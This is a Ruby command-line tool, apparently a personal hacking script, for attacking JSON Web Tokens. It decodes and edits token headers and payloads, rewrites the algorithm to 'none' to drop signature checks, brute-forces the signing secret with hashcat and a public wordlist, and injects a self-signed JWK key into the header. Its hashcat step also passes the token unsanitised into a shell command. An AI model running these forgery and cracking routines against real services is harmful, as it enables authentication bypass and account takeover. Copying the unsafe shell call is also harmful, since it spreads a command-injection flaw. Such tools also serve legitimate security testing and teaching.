#!/usr/bin/env ruby
require 'base64'
require 'optparse'
require 'json'
require 'jwt'
require 'uri'

# Esthetics things here nothing serious 

def banner()
	print "						github.com/NioZow".yellow
	puts %q"
  __   __    __  _____          ___  _                           
  \ \ / / /\ \ \/__   \ ___    / _ \| |  __ _  _   _   ___  _ __ 
   \ \\ \/  \/ /  / /\// __|  / /_)/| | / _` || | | | / _ \| '__|
/\_/ / \  /\  /  / /   \__ \ / ___/ | || (_| || |_| ||  __/| |   
\___/   \/  \/   \/    |___/ \/     |_| \__,_| \__, | \___||_|   
                                               |___/          
".red
	puts "Just playing with some tokens\n".yellow
end

class String
  def red; colorize(self, "\e[1m\e[31m"); end
  def green; colorize(self, "\e[1m\e[32m"); end
  def dark_green; colorize(self, "\e[32m"); end
  def yellow; colorize(self, "\e[1m\e[33m"); end
  def blue; colorize(self, "\e[1m\e[34m"); end
  def dark_blue; colorize(self, "\e[34m"); end
  def purple; colorize(self, "\e[35m"); end
  def dark_purple; colorize(self, "\e[1;35m"); end
  def cyan; colorize(self, "\e[1;36m"); end
  def dark_cyan; colorize(self, "\e[36m"); end
  def pure; colorize(self, "\e[0m\e[28m"); end
  def bold; colorize(self, "\e[1m"); end
  def colorize(text, color_code) "#{color_code}#{text}\e[0m" end
end

# Edit header, payload... & view
def edit_header(jwt)
  print "Edit header " + jwt[:header_decoded].yellow + " [y/N]: "
  answer = STDIN.gets.chomp()

  if ["yes", "y", "Y," "YES", "yeah", "YEAH"].include? answer
    print "New header: "
    jwt[:header_decoded] = STDIN.gets.chomp()
    jwt[:header_encoded] = (Base64.encode64 jwt[:header_decoded]).delete("\n")
  end
  return jwt
end

def edit_payload(jwt)
  print "Edit payload " + jwt[:payload_decoded].yellow + " [y/N]: "
  answer = STDIN.gets.chomp()

  if ["yes", "y", "Y," "YES", "yeah", "YEAH"].include? answer
    print "New payload: "
    jwt[:payload_decoded] = STDIN.gets.chomp()
    jwt[:payload_encoded] = (Base64.encode64 jwt[:payload_decoded]).delete("\n")
  end
  return jwt
end

def edit_jwt(jwt)
  jwt = edit_header(jwt) unless jwt[:header_modified]
  jwt = edit_payload(jwt) unless jwt[:payload_modified]
  puts "New token: ".yellow + "#{jwt[:header_encoded]}.#{jwt[:payload_encoded]}.#{jwt[:signature_encoded]}"
end

def view(jwt)
  puts "Header: ".yellow + jwt[:header_decoded]
  puts "Payload: ".yellow + jwt[:payload_decoded]
  puts "Signature: ".yellow + jwt[:signature_encoded].to_s
end

# Setup the JWT (check format & format it for easy use through ruby hashes)

def check_validity(jwt) return jwt.count(".") == 2 end

def jwt_format(jwt)
	header_encoded, payload_encoded, signature_encoded = jwt.split(".")
  return {:header_encoded => header_encoded, :payload_encoded => payload_encoded, :signature_encoded => signature_encoded, :header_decoded => Base64.decode64(header_encoded), :payload_decoded => Base64.decode64(payload_encoded), :header_modified => false, :payload_modified => false}
end

# Functions to attack the JWT (algorithm_2_none, hashcat, sign, self-signed...)

def algorithm_2_none(jwt, none)
  # None is an accepted type of algorithm by the JWTs if you change the header to None you might bypass
  # You can write "None" or "nOnE" in anyway so obfuscate it (u might want to do some tricks with the not LATIN characters ;)

  none = "None" if none == true

  header_decoded = JSON.parse(jwt[:header_decoded])
  header_decoded['alg'] = none
  jwt[:header_decoded] = header_decoded.to_json
  jwt[:header_encoded] = (Base64.encode64 jwt[:header_decoded]).delete("\n")

  jwt = edit_payload(jwt) unless jwt[:payload_modified]

  puts "New token: ".yellow + "#{jwt[:header_encoded]}.#{jwt[:payload_encoded]}."
end

def hashcat(jwt)
  # Brute force using this wordlist the jwt secret key: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
  # Does system commands to use hashcat
  jwt_format = "#{jwt[:header_encoded]}.#{jwt[:payload_encoded]}.#{jwt[:signature_encoded]}"
  
  unless File.exist? "/usr/share/wordlists/jwt.secrets.list"
    puts "/usr/share/wordlists/jwt.secrets.list doesn't exist aborting!".red
    puts "Here is the link to the wordlist: ".yellow + "https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list"
    exit
  end

  puts "Attempting to crack the secret using hashcat".yellow
  hashcat = `hashcat -a 0 -m 16500 #{jwt_format} /usr/share/wordlists/jwt.secrets.list`
  result = `hashcat -a 0 -m 16500 #{jwt_format} --show |grep ":" | cut -d ":" -f 2`
  if result.length > 0
    puts "Secret found: ".yellow + "#{result}"
  else
    puts "The secret was not found.".red
  end
end

def sign(jwt, key)
  # To sign the jwts using the key found with hashcat

  key = File.read key if File.exist? key
  payload = jwt[:header_encoded] + "." + jwt[:payload_encoded]
  # header_decoded = JSON.parse(jwt[:header_decoded])
  # algorithm = header_decoded['alg']
  # key_openssl = OpenSSL::PKey.read("/home/noah/Desktop/git/web-scripts/key")
  # puts JWT.encode(payload, key, algorithm.to_sym)

  puts "Still working on it meanwhile please use: ".yellow + "https://jwt.io/#debugger-io"
  puts "Copy & paste this payload: ".yellow + payload
  puts "Use this key (do not check secret base64 encoded): ".yellow + key
end

def self_signed_jwk(jwt)
  # This technique tells the server the jwt can be decrypted using a certain public key, in this case we encrypt it using our own private key and send that public key
  # I will implement key generation later, for now let's use a static generated key
  
  header_decoded_hash = JSON.parse(jwt[:header_decoded])
  key_id = header_decoded_hash['kid']

  n = "vHiPVPwuWHpuSbd3r9IidodaBYRUhQdiUE9qzghsxm5GXse0YcKAQa2-9n2g2Z0jhSJ6A5XtQtG-XE_GXEpBFtOWJ9jrJKpAesC7Y7mg-fl0KpOfuvZFasOVQC4-wrkFBjz8oT6DKkv2jMlg52Gz8hCbb3_HJIBxffEA1XOyXteyi2qzojTFETbNSQh-ZmhBJCp66WrGjx0HwrAzNmago42lLNw2CgX2zTpQi7WCyAnM0mnMVi38Gs2PF2HgjMF179SrwtWcT-BUgXMkgP4ixJnXey96h55P6wlU2wfVQ2KEmutmJ8FkmWH19QjgrXAgd0LpKRpCUDC6UUJJkMbapw"

  if key_id == nil
    header_decoded_hash['jwk'] = {"kty" => "RSA", "e" => "AQAB", "n" => n}
  else
    header_decoded_hash['jwk'] = {"kty" => "RSA", "e" => "AQAB", "kid" => key_id, "n" => n}
  end
  jwt[:header_decoded] = header_decoded_hash.to_json
  jwt[:header_encoded] = (Base64.encode64 jwt[:header_decoded]).delete("\n")

  payload = jwt[:header_encoded] + "." + jwt[:payload_encoded]
  puts "Payload: ".yellow + payload
  priv_key = OpenSSL::PKey::RSA.new File.read 'jwt_private_key.pem'
  token = JWT.encode payload, priv_key, 'RS256'
  # puts "Token: ".yellow + token
end

def main()
	banner

	options = {}

  OptionParser.new do |opt|
    opt.on('-v', '--view', 'View the token in a decoded format') { |o| options[:view] = o}
    opt.on('-e', '--edit', 'Edit the token') { |o| options[:edit] = o}
    opt.on('-t JWT', '--token JWT', 'Mandatory option: specifiy a JWT') { |o| options[:jwt] = o}
    opt.on('-n None', '--none None', 'Switch the algorithm to "None" and remove the signature') { |o| options[:none] = o}
    opt.on('-p PAYLOAD', '--payload PAYLOAD', 'Edit the token with the specified payload, not compatible with --hashcat'){ |o| options[:payload] = o}
    opt.on('--header HEADER', 'Edit the token with the specified header, not compatible with --hashcat'){ |o| options[:header] = o}
    opt.on('--hashcat', 'Launch hashcat using system commands and attempts to crack the secret'){ |o| options[:hashcat] = o}
    opt.on('-c URL', '--check URL', 'Check if the new generated token works by testing it on the URL (not done yet)') {|o| options[:check] = o}
    opt.on('-s SECRET', '--sign SECRET', 'Sign the token using a specified string or keyfile') {|o| options[:sign] = o}
    opt.on('--self-signed-jwk', 'Injects a self-signed JWT via the jwt header parameter (not done yet)') {|o| options[:self_signed_jwk] = o}
    opt.on('--self-signed-jku', 'Injects a self-signed JWT via the jku header parameter (not done yet)') {|o| options[:self_signed_jku]= o}
  end.parse!

  jwt = options[:jwt]

  if jwt == nil
    puts "No JWT was specified, quitting!".red
    exit
  end

	unless check_validity(jwt)
		puts "Invalid jwt format!".red
		exit
	end

  jwt = jwt_format(jwt)

  if options[:payload] != nil
    jwt[:payload_decoded] = options[:payload]
    jwt[:payload_encoded] = (Base64.encode64 jwt[:payload_decoded]).delete("\n")
    jwt[:payload_modified] = true
  end
  if options[:header] != nil
    jwt[:header_decoded] = options[:header]
    jwt[:header_encoded] = (Base64.encode64 jwt[:header_decoded]).delete("\n")
    jwt[:header_modified] = true
  end

  if options[:view]
    view jwt
  elsif options[:edit]
    edit_jwt jwt
  elsif options[:none]
    algorithm_2_none(jwt, options[:none])
  elsif options[:hashcat]
    hashcat jwt if (options[:header] == nil and options[:payload] == nil)
  elsif options[:sign]
    sign(jwt, options[:sign])
  elsif options[:self_signed_jwk]
    self_signed_jwk(jwt)
  end
end

main